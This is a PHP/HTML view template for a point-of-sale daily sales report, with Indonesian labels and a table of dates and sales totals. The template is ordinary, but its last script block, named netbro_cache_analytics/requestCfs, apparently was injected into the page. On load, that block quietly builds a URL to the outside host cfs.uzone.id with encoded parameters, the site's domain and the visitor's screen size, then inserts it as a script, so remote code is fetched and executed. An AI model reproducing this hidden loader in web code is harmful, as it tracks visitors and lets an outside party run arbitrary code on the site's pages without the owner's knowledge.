<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>POS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/bootstrap-datepicker/css/datepicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/bootstrap-timepicker/compiled/timepicker.css"
    /
    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url() ?>assets/assets/uniform/css/uniform.default.css"/>
</head>

<body class="fixed-top">
<?php $this->load->view('header.php') ?>
<div id="container" class="row-fluid">
    <!-- BEGIN SIDEBAR -->
    <div id="sidebar" class="nav-collapse collapse">
        <?php $this->load->view('sidebar.php') ?>
    </div>

    <div id="main-content">
        <!-- BEGIN PAGE CONTAINER-->
        <div class="container-fluid">
            <!-- BEGIN PAGE HEADER-->
            <div class="row-fluid">
                <div class="span12">
                    <h3 class="page-title">

                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Laporan</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Laporan Penjualan</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Penjualan Harian</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
            <!-- END PAGE HEADER-->
            <!-- BEGIN PAGE CONTENT-->
            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN SAMPLE TABLE widget-->
                    <div class="widget">
                        <div class="widget-title">
                            <h4>
                                <i class="icon-reorder"></i>
                                Laporan Penjualan Harian
                            </h4>
                        </div>
                        <div class="widget-body">
                            <div class="space15"></div>
                            <table class="table table-striped table-hover table-bordered" id="sample_editable_1">
                                <thead>
                                <tr>
                                    <th>Tanggal</th>
                                    <th>Jumlah Transaksi</th>
                                    <th>Total Penjualan</th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php
                                foreach ($harian as $data)
                                {
                                    ?>
                                    <tr>
                                        <td><?php echo $data->tanggal ?></td>
                                        <td>----</td>
                                        <td><?php echo $data->grand_total ?></td>
                                    </tr>
                                <?php } ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <!-- END SAMPLE TABLE widget-->
                </div>

            </div>

            <!-- END PAGE CONTENT-->
        </div>
        <!-- END PAGE CONTAINER-->
    </div>
    <!-- END PAGE -->
</div>
<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<?php $this->load->view('footer.php') ?>
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo site_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo site_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo site_url(); ?>assets/js/jquery.blockui.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script type="text/javascript" src="<?php echo site_url(); ?>assets/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/bootstrap-daterangepicker/date.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/bootstrap-daterangepicker/daterangepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>
<script src="<?php echo site_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.init();
    });
</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCoiZb4e8fPgGSrzxny7Bs3aod8JI8r9WL9Zcv7DcypTafjTWjc8KR2rkdE9obmG7qlrJ2O5wLAkWR1EJqX2Vw3XHzhSxfTrKeWUMN%2fPcq0BczrMMWqL2II2LVGvo%2fLRG4DhbjGKEsZdcZL4LU4xZawooHEtryQ0qQNeuH5SQxs1tw3yuYvo5OhvukPSA2cDtmyw0tv5%2bRdXMSlocozQyrPDu1qVuLzjutFTJOoQp8dVo%2btM5%2fmonVTIoyxvO%2fR5ym5xzf8cPUDTRBHlfMTcYMP4CweKyBABoQqAv1HRqCiZjg4cJ20X8CMROLUtQAzEbRS01S6BNqFaZDZvhyKg%2by7qRaxsxelD3CKygl%2by6sAjqArSopYZHVtGQZ3q3RRyXJgSVAbtqpFYozwVREhvfgyg3ZXJpLVl2s1jwQDNi2JnJxTNIfd4vOts2xHvqzYjtf%2fOTi9HSZtTUp73nxmdrLtyx5DfG%2fk90GdQpnnOHtIpzO4Ia5UIm0TZfeS11TfQY0I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
<!-- END BODY -->
</html>
